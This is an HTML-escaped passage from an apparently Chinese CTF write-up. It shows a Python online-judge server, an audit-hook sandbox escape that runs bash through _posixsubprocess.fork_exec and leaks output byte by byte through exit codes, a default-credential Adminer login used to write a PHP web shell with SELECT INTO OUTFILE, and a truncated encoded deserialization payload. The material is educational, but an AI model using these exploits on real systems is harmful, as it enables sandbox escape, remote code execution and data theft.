=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;run_code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;code_filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; expected_output_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;144&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; infile&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;145&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        expected_output_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;146&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; expected_output&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;147&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        expected_output_content &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; expected_output&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;148&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;149&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        process &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Popen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;150&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;python3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; code_filename&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;151&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            stdin&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;infile&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;152&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            stdout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PIPE&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;153&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            stderr&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PIPE&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;154&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;155&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;156&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;157&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;158&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;communicate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;159&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;TimeoutExpired&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;160&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            process&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;161&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; OJTimeLimitExceed&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;162&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;163&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;returncode &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;164&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; OJRuntimeError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;returncode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;165&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;166&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; expected_output_content&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;167&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;168&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;169&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;170&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;171&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;172&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;173&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;0.0.0.0&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;oj 判题系统，后端用过 audithook 限制代码的行为，只允许某些特定的时间（import，time.sleep,builtins.input）执行&lt;/p&gt;
&lt;p&gt;python 代码中，会执行我提交的代码，上文限制了代码的行为（os,subprocess 等）或者执行不允许的系统调用（如 input () 都会抛出错误）&lt;/p&gt;
&lt;p&gt;这题不回显，不出网，利用 oj 系统的一个特性：&lt;/p&gt;
&lt;h5 id=&#34;oj-系统将命令执行的输出回显为退出码攻击者可以通过获取退出码的信息来提取子进程的输出进一步分析和获取系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oj-系统将命令执行的输出回显为退出码攻击者可以通过获取退出码的信息来提取子进程的输出进一步分析和获取系统信息&#34;&gt;#&lt;/a&gt; OJ 系统将命令执行的输出回显为退出码，攻击者可以通过获取退出码的信息来提取子进程的输出，进一步分析和获取系统信息。&lt;/h5&gt;
&lt;p&gt;这样就可以用 fork_exec () 用于执行命令并将标准输出重定向到管道，从而能够将命令的输出回传给父进程。通过这种方式，子进程执行的命令输出就可以通过推出吗的形式返回&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;导入模块&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑import os
import time
import sys
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;os&lt;/code&gt; ：用于操作系统相关的功能，如管道和文件操作。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;time&lt;/code&gt; ：用于控制程序的执行时间，这里用来确保子进程执行完成。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sys&lt;/code&gt; ：用于处理程序的退出码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;动态导入  &lt;code&gt;_posixsubprocess&lt;/code&gt; &lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python


复制编辑
exec(&#39;import _posixsubprocess&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;通过  &lt;code&gt;exec&lt;/code&gt;  动态导入  &lt;code&gt;_posixsubprocess&lt;/code&gt;  模块，绕过了审计钩子的限制。正常情况下， &lt;code&gt;import&lt;/code&gt;  会被审计拦截，但  &lt;code&gt;exec&lt;/code&gt;  可以用来执行任意代码，允许动态导入模块。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;创建管道&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑std_pipe = os.pipe()
err_pipe = os.pipe()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;os.pipe()&lt;/code&gt;  创建一个管道，返回一对文件描述符，分别用于读取（ &lt;code&gt;std_pipe[0]&lt;/code&gt; ）和写入（ &lt;code&gt;std_pipe[1]&lt;/code&gt; ）数据。&lt;/li&gt;
&lt;li&gt;通过管道，我们可以将命令的输出从子进程传递给父进程。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;执行命令&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑_posixsubprocess.fork_exec(
    (b&amp;quot;/bin/bash&amp;quot;, b&amp;quot;-c&amp;quot;, b&amp;quot;ls /&amp;quot;),  # 命令
    [b&amp;quot;/bin/bash&amp;quot;],
    True,
    (),
    None,
    None,
    -1,
    -1,
    -1,
    std_pipe[1],  # c2pwrite
    -1,
    -1,
    *(err_pipe),
    False,
    False,
    False,
    None,
    None,
    None,
    -1,
    None,
    False,
)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_posixsubprocess.fork_exec()&lt;/code&gt;  用于执行指定的命令（在此示例中是  &lt;code&gt;ls /&lt;/code&gt; ）。它会创建一个新的进程，并执行该命令。&lt;/li&gt;
&lt;li&gt;关键参数：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;(b&amp;quot;/bin/bash&amp;quot;, b&amp;quot;-c&amp;quot;, b&amp;quot;ls /&amp;quot;)&lt;/code&gt; ：表示要执行的命令，这里是通过  &lt;code&gt;bash&lt;/code&gt;  执行  &lt;code&gt;ls /&lt;/code&gt;  命令。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;std_pipe[1]&lt;/code&gt; ：指定命令的标准输出会重定向到  &lt;code&gt;std_pipe&lt;/code&gt; ，即命令的输出会写入管道。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;err_pipe&lt;/code&gt; ：标准错误输出也重定向到另一个管道，但这段代码并没有使用它。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;确保子进程执行完成&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python


复制编辑
time.sleep(0.1)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;程序在这里暂停 0.1 秒，确保子进程执行完成并且输出被写入到管道中。因为管道是异步操作，所以我们需要稍等片刻，保证数据已经被完全写入。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;读取管道中的输出&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑content = os.read(std_pipe[0], 1024)
content_len = len(content)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;os.read(std_pipe[0], 1024)&lt;/code&gt;  读取管道中的内容。 &lt;code&gt;std_pipe[0]&lt;/code&gt;  是管道的读取端。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1024&lt;/code&gt;  是读取的字节数。根据命令的输出内容大小，你可能需要调整这个值。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;content_len&lt;/code&gt;  存储管道中内容的长度。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;根据输出位置返回字符&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑if &amp;#123;loc&amp;#125; &amp;lt; content_len:
    sys.exit(content[&amp;#123;loc&amp;#125;])  # 退出码为读取到的字符
else:
    sys.exit(255)  # 如果没有数据，则返回 255
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;loc&amp;#125;&lt;/code&gt;  是一个占位符，表示我们要读取命令输出中的某个位置的字符。&lt;/li&gt;
&lt;li&gt;如果读取到的内容长度大于  &lt;code&gt;&amp;#123;loc&amp;#125;&lt;/code&gt; ，那么返回该位置的字符作为退出码（ &lt;code&gt;sys.exit(content[&amp;#123;loc&amp;#125;])&lt;/code&gt; ）。&lt;/li&gt;
&lt;li&gt;如果读取到的内容不足  &lt;code&gt;&amp;#123;loc&amp;#125;&lt;/code&gt; ，则返回  &lt;code&gt;255&lt;/code&gt; ，表示没有更多数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;提交请求部分&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提交请求部分&#34;&gt;#&lt;/a&gt; 提交请求部分&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑command = &amp;quot;ls /&amp;quot;  # 你可以修改命令，比如 &#39;cat /flag&#39; 或其他
received = &amp;quot;&amp;quot;

for i in range(254):
    code = CODE_TEMPLATE.format(loc=i, command=command)  # 格式化代码模板
    data = &amp;#123;&amp;quot;problem_id&amp;quot;: 0, &amp;quot;code&amp;quot;: code&amp;#125;  # 请求数据
    resp = requests.post(URL, json=data)  # 提交请求
    resp_data = resp.json()

    # 确保程序返回运行时错误
    assert(resp_data[&amp;quot;status&amp;quot;] == &amp;quot;RE&amp;quot;)

    # 查找退出码位置
    ret_loc = resp_data[&amp;quot;message&amp;quot;].find(&amp;quot;ret=&amp;quot;)
    ret_code = resp_data[&amp;quot;message&amp;quot;][ret_loc + 4:]

    if ret_code == &amp;quot;255&amp;quot;:  # 255 表示没有更多数据
        break

    # 将返回的退出码转换为字符并拼接
    received += chr(int(ret_code))
    print(received)
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;命令设置&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python


复制编辑
command = &amp;quot;ls /&amp;quot;  # 你可以修改命令，比如 &#39;cat /flag&#39; 或其他
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;这里  &lt;code&gt;command&lt;/code&gt;  设置为  &lt;code&gt;ls /&lt;/code&gt; ，你可以修改为  &lt;code&gt;cat /flag&lt;/code&gt;  或其他命令，来获取你想要的信息（比如 flag）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;请求循环&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑for i in range(254):
    code = CODE_TEMPLATE.format(loc=i, command=command)  # 格式化代码模板
    data = &amp;#123;&amp;quot;problem_id&amp;quot;: 0, &amp;quot;code&amp;quot;: code&amp;#125;  # 请求数据
    resp = requests.post(URL, json=data)  # 提交请求
    resp_data = resp.json()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;通过循环从位置  &lt;code&gt;i = 0&lt;/code&gt;  到  &lt;code&gt;i = 253&lt;/code&gt;  提交代码， &lt;code&gt;loc=i&lt;/code&gt;  表示我们每次从命令输出中读取不同位置的字符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data&lt;/code&gt;  包含要提交的代码和问题 ID， &lt;code&gt;requests.post()&lt;/code&gt;  用来将代码提交给 OJ 系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;处理返回的响应&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python


复制编辑
assert(resp_data[&amp;quot;status&amp;quot;] == &amp;quot;RE&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;确保 OJ 系统返回的是运行时错误（ &lt;code&gt;RE&lt;/code&gt; ），意味着程序执行没有通过审计，且输出通过退出码返回。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查找退出码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑ret_loc = resp_data[&amp;quot;message&amp;quot;].find(&amp;quot;ret=&amp;quot;)
ret_code = resp_data[&amp;quot;message&amp;quot;][ret_loc + 4:]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;查找返回消息中的  &lt;code&gt;ret=&lt;/code&gt;  字符串，从中提取出实际的退出码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;停止条件&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑if ret_code == &amp;quot;255&amp;quot;:  # 255 表示没有更多数据
    break
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;如果返回的退出码是  &lt;code&gt;255&lt;/code&gt; ，表示没有更多数据，结束循环。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;拼接输出并打印&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python复制编辑received += chr(int(ret_code))
print(received)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;将每次获取的字符拼接到  &lt;code&gt;received&lt;/code&gt;  变量中，并打印已拼接的输出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;打卡ok&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打卡ok&#34;&gt;#&lt;/a&gt; 打卡 ok：&lt;/h3&gt;
&lt;h4 id=&#34;非预期&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#非预期&#34;&gt;#&lt;/a&gt; 非预期：&lt;/h4&gt;
&lt;p&gt;～泄漏，发现 adminer_481.php，登陆后修改用户密码登陆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251921467.png&#34; alt=&#34;image-20250225192122313&#34;&gt;&lt;/p&gt;
&lt;p&gt;默认用户密码登录：root;root&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251922483.png&#34; alt=&#34;image-20250225192225138&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以有 SQL 命令执行&lt;/p&gt;
&lt;p&gt;可以用命令写入 web 网站里面&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select &amp;quot;1111&amp;lt;?php $a=&#39;cat /Ali_t1hs_1sflag_2025&#39;;system($a);?&amp;gt;&amp;quot; into outfile &amp;quot;/var/www/html/shell3.php&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以修改 $a 的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251923837.png&#34; alt=&#34;image-20250225192346787&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502251923643.png&#34; alt=&#34;image-20250225192355442&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;预期&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#预期&#34;&gt;#&lt;/a&gt; 预期：&lt;/h4&gt;
&lt;p&gt;（没给源码怎么进行代码审计呢）&lt;/p&gt;
&lt;p&gt;审计代码，利用绕过 date 函数反序列化逃逸&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /index.php?debug_buka=%5c%31%5c%32%5c%33%5c%78%5c%78%5c%78%5c%78%5c%22%5c%3b%5c%73%5c%3a%5c%34%5c%3a%5c%22%5c%74%5c%69%5c%6d%5c%65%5c%22%5c%3b%5c%73%5c%3a%5c%32%5c%3a%5c%22%5c%31%5c%32%5c%22%5c%3b%5c%73%5c%3a%5c%31%5c%30%5c%3a%5c%22%5c%62%5c%61%5c%63%5c%6b%5c%67%5c%72%5c%6f%5c%75%5c%6e%5c%64%5c%22%5c%3b%5c%73%5c%3a%5c%34%5c%33%5c%3a%5c%22%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%2e%5c%2e%5c%2f%5c%75%5c%73%5c%72%5c%2f%5c%6c%5c%6f%5c%63%5c%61%5c%6c%5c%2f%5c%6c%5c%69%5c%62%5c%2f%5c%70%5c%68%5c%70%5c%2f%5c%70%5c%65%5c%61%5c%72%5c%63%5c%6d%5c%64%22%5c%3b%5c%7d HTTP/1.1

